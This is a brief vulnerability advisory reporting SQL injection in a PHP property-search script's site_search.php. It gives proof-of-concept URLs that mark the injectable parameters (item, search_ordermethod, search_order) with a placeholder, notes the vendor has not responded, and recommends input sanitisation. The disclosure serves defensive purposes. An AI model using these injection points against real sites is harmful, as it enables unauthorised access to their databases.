This PHP script is vulnerable to SQL Injection in site_search.php file.

Manipulating the unfiltred variables, a user can execute SQL commands
to gather other information. The problem is located under the
variables item, search_ordermethod and search_order.

Proof of concept:

site_search.php?search_purpose=sale&search_type=&
search_price_min=&search_price_max=&search_bedroom=1&
search_bathroom=1&search_city=&search_state=&
search_zip=&search_radius=&search_country=&
search_order=type&search_ordermethod=asc&page=2&
item=5'SQL INJECTION

site_search.php?search_purpose=sale&search_type=&
search_price_min=&search_price_max=&search_bedroom=1&
search_bathroom=1&search_city=&search_state=&
search_zip=&search_radius=&search_country=&
search_order=type&search_ordermethod=asc'SQL INJECTION&
page=2&item=5

site_search.php?search_purpose=sale&search_type=&
search_price_min=&search_price_max=&search_bedroom=1&
search_bathroom=1&search_city=&search_state=&
search_zip=&search_radius=&search_country=&
search_order=type'SQL INJECTION&search_ordermethod=asc&
page=2&item=5

Solution: The vendor was contacted 2 weeks ago and still not reply to
my email. It can be fixed with the sanitize of the variables.
